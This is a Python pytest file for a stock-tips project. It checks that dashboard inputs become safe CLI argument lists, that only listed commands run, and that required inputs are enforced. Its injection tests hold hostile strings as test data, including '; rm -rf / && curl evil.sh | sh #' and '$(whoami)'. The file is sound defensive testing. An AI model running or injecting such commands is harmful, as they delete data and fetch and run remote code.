"""The dashboard→GitHub bridge. This is the security boundary: browser input becomes argv, never shell."""
import os
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
os.environ.setdefault("STOCKTIPS_ROOT", str(ROOT))
sys.path.insert(0, str(ROOT / "src"))
sys.path.insert(0, str(ROOT / "scripts"))

import desk_command as desk  # noqa: E402


@pytest.fixture(autouse=True)
def clean_env(monkeypatch):
    for k in list(os.environ):
        if k.startswith("DESK_"):
            monkeypatch.delenv(k, raising=False)


def dispatch(**inputs):
    """One dispatch = one complete set of inputs, exactly as a workflow run receives it."""
    for k in [k for k in os.environ if k.startswith("DESK_")]:
        del os.environ[k]
    for k, v in inputs.items():
        os.environ["DESK_" + k.upper()] = str(v)
    return desk.build_argv()


def test_each_command_maps_to_the_cli_the_analyst_would_have_typed():
    assert dispatch(command="book", symbol="CGPOWER", amount="25000") == ["book", "CGPOWER", "--capital", "25000"]
    assert dispatch(command="eod") == ["eod", "--force"]
    assert dispatch(command="pick") == ["pick", "--no-book"]          # dry run by default
    assert dispatch(command="pick-book") == ["pick"]                  # the booking variant is a separate choice
    assert dispatch(command="dashboard-data") == ["dashboard-data"]


def test_shell_metacharacters_survive_as_one_plain_argument():
    argv = dispatch(command="close", symbol="CGPOWER", note='; rm -rf / && curl evil.sh | sh #')
    assert argv == ["close", "CGPOWER", "--note", "; rm -rf / && curl evil.sh | sh #"]
    # one element, not split, not interpreted
    assert len([a for a in argv if "rm -rf" in a]) == 1

    argv = dispatch(command="lesson", text="$(whoami) `id` ${HOME}")
    assert argv == ["lesson", "$(whoami) `id` ${HOME}"]


def test_only_listed_commands_can_be_dispatched():
    for attempt in ("rm", "gather; rm -rf /", "../../bin/sh", "", "BOOK", "eval"):
        with pytest.raises(SystemExit, match="unknown command"):
            dispatch(command=attempt)


def test_required_inputs_are_enforced_before_anything_runs():
    with pytest.raises(SystemExit, match="book needs symbol"):
        dispatch(command="book", amount="25000")
    with pytest.raises(SystemExit, match="capital needs one of: amount, withdraw"):
        dispatch(command="capital", note="oops")
    with pytest.raises(SystemExit, match="add-tip needs source"):
        dispatch(command="add-tip", symbol="TATASTEEL")
    with pytest.raises(SystemExit, match="lesson needs text"):
        dispatch(command="lesson")


def test_unknown_inputs_are_dropped_rather_than_forwarded():
    argv = dispatch(command="book", symbol="CGPOWER", amount="25000", price="1", kind="x", query="y", url="z")
    assert argv == ["book", "CGPOWER", "--capital", "25000"]          # book takes no --price/--kind/--url


def test_blank_and_whitespace_inputs_are_treated_as_absent():
    assert dispatch(command="close", symbol="CGPOWER", price="   ", note="") == ["close", "CGPOWER"]
    with pytest.raises(SystemExit, match="needs symbol"):
        dispatch(command="book", symbol="   ")


def test_every_workflow_choice_is_a_command_the_runner_accepts():
    import yaml
    wf = yaml.safe_load((ROOT / ".github" / "workflows" / "desk.yml").read_text(encoding="utf-8"))
    choices = wf[True]["workflow_dispatch"]["inputs"]["command"]["options"]   # PyYAML reads `on:` as True
    assert set(choices) == set(desk.SPEC), "the workflow's choices and the runner's spec have drifted apart"


def test_every_flag_the_runner_can_emit_exists_on_that_cli_command():
    import argparse
    from stocktips import cli

    parsers: dict[str, argparse.ArgumentParser] = {}
    real_add = argparse._SubParsersAction.add_parser

    def spy(self, name, **kw):
        p = real_add(self, name, **kw)
        parsers[name] = p
        return p

    argparse._SubParsersAction.add_parser = spy
    try:
        try:
            cli.main(["status", "--help"])
        except SystemExit:
            pass
    finally:
        argparse._SubParsersAction.add_parser = real_add

    for command, spec in desk.SPEC.items():
        target = spec.get("cli", command)
        assert target in parsers, f"{command} dispatches to a CLI command that does not exist: {target}"
        known = {s for a in parsers[target]._actions for s in a.option_strings}
        for flag in list(spec["flags"].values()) + spec.get("bare", []):
            if flag:
                assert flag in known, f"{command} would pass {flag}, which `stocktips {target}` does not accept"
